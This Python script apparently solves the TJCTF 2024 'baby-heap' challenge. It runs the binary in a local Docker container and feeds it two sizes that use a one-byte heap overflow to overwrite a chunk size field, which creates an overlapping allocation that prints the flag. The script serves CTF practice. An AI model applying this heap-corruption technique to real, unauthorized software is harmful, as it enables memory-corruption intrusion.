#!/usr/bin/env python3
"""Replay TJCTF 2024 baby-heap as a local heap metadata proof.

This helper is for local or explicitly authorized CTF challenge artifacts. It
runs the Linux challenge binary in a local container, uses the one-byte overflow
from chunk `a` into chunk `b`'s size field, then allocates a size that overlaps
the flag-bearing reader chunk and captures the printed flag.
"""

from __future__ import annotations

import argparse
import re
import shutil
import subprocess
import sys
from pathlib import Path


FLAG_RE = re.compile(r"(?i)(?:tjctf|flag|ctf)\{[^{}\r\n]{3,300}\}")
PLACEHOLDER_MARKERS = ("TEST_FLAG", "FLAG_FOR_TESTING", "DUMMY", "PLACEHOLDER")


def default_parameters() -> tuple[int, int]:
    return 0xA1, 0x90


def build_input_stream(attack_size: int, new_size: int) -> bytes:
    return f"{attack_size}\n{new_size}\n".encode()


def extract_flags(text: str) -> list[str]:
    flags: list[str] = []
    for match in FLAG_RE.finditer(text):
        candidate = match.group(0)
        if any(marker in candidate.upper() for marker in PLACEHOLDER_MARKERS):
            continue
        if candidate not in flags:
            flags.append(candidate)
    return flags


def solve_binary_dir(binary_dir: Path, image: str = "ubuntu:22.04", timeout: float = 20.0) -> str:
    docker = shutil.which("docker")
    if not docker:
        raise RuntimeError("docker is required to replay the Linux challenge binary")
    binary = binary_dir / "out"
    flag_file = binary_dir / "flag.txt"
    if not binary.exists():
        raise FileNotFoundError(f"missing challenge binary: {binary}")
    if not flag_file.exists():
        raise FileNotFoundError(f"missing local flag file: {flag_file}")
    attack_size, new_size = default_parameters()
    command = [
        docker,
        "run",
        "--rm",
        "-i",
        "--platform",
        "linux/amd64",
        "-v",
        f"{binary_dir}:/work:ro",
        "-w",
        "/work",
        image,
        "./out",
    ]
    completed = subprocess.run(
        command,
        input=build_input_stream(attack_size, new_size),
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        timeout=timeout,
        check=False,
    )
    text = completed.stdout.decode("utf-8", errors="replace")
    flags = extract_flags(text)
    if not flags:
        raise RuntimeError(f"no non-placeholder flag found in transcript: {text[-400:]!r}")
    overlap_ok = "blocker + 0x10 == c: 1" in text
    print("challenge: baby-heap")
    print("artifact: binary out")
    print(f"attack_size: 0x{attack_size:x}")
    print(f"new_size: 0x{new_size:x}")
    print(f"overlap_evidence: {overlap_ok}")
    print("method: one-byte heap size overwrite creates an overlapping allocation that prints reader flag bytes")
    print(f"flag: {flags[0]}")
    return flags[0]


def main() -> int:
    parser = argparse.ArgumentParser(description="Replay TJCTF baby-heap from local CTF artifacts.")
    parser.add_argument("--binary-dir", type=Path, required=True, help="directory containing out and flag.txt")
    parser.add_argument("--image", default="ubuntu:22.04", help="Linux container image used to run the ELF")
    parser.add_argument("--timeout", type=float, default=20.0)
    args = parser.parse_args()
    try:
        solve_binary_dir(args.binary_dir.resolve(), image=args.image, timeout=args.timeout)
    except Exception as exc:
        print(f"[!] {exc}", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
